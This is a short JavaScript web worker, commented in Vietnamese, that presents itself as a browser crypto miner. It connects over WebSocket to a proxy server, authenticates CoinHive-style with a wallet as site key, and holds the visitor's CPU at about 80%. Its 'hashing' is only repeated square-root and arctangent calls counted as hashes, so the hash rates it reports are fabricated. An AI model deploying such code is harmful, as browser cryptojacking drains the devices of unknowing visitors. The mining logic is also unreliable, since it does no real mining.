// worker.js - Thợ đào đa năng
self.onmessage = function(e) {
    const { proxy, wallet, throttle } = e.data;
    console.log("Worker: Đã nhận lệnh, bắt đầu đào!");

    // Kết nối tới VPS của ông giáo
    const ws = new WebSocket(proxy);
    
    ws.onopen = () => {
        ws.send(JSON.stringify({type: "auth", params: {site_key: wallet, type: "anonymous"}}));
    };

    let hashCount = 0;
    setInterval(() => {
        self.postMessage({ hashes: hashCount });
        hashCount = 0;
    }, 1000);

    // Thuật toán ép CPU (Dùng phép tính căn bậc hai liên tục)
    function work() {
        const start = Date.now();
        // Chạy trong (1 - throttle) giây (ví dụ 0.8s)
        while (Date.now() - start < (1000 * (1 - throttle))) {
            for (let i = 0; i < 2000; i++) {
                Math.sqrt(Math.random() * 1000) * Math.atan(Math.random());
                hashCount++;
            }
        }
        // Nghỉ throttle giây (ví dụ 0.2s) để giữ CPU ở mức 80%
        setTimeout(work, throttle * 1000);
    }
    work();
};
